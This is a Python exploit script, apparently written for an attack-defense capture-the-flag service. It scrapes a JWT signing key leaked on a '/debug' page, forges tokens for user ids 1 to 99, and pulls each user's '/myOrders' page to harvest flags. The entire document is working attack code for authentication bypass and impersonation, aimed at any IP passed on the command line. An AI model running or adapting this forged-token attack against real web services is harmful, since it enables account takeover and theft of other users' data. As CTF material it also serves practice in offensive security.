#!/usr/bin/env python3
import requests
import re
import sys
import string
import random
import datetime
import jwt

ip = sys.argv[1]
host = f"http://{ip}:8084"
s = requests.Session()
user_name=''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(15))
password=''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(15))

r = s.get(
  host + '/debug'
)

private_key=re.findall("\<tr\>\<td class=\"e\"\>JWTKey \</td\>\<td class=\"v\"\>(.*?) \</td\>\</tr\>", r.text)[0]
for id in range (1, 100):
  payload0={
      "sub": id,
      "exp": int(datetime.datetime.now().timestamp()) + 600,
  }
  headers0 = {
    "alg": "HS256",
    "typ": "JWT"
  }
  encoded_jwt=(jwt.encode(payload=payload0,key=private_key,algorithm="HS256",headers=headers0)).decode()
  s.cookies['Authorization']=encoded_jwt
  r1=s.get(
    host+"/myOrders"
  )
  flags=re.findall("\</p\>\<p style=\'margin: 4px 8px\'\>(.*?)\</p\>", r1.text)
  print (flags,flush=True)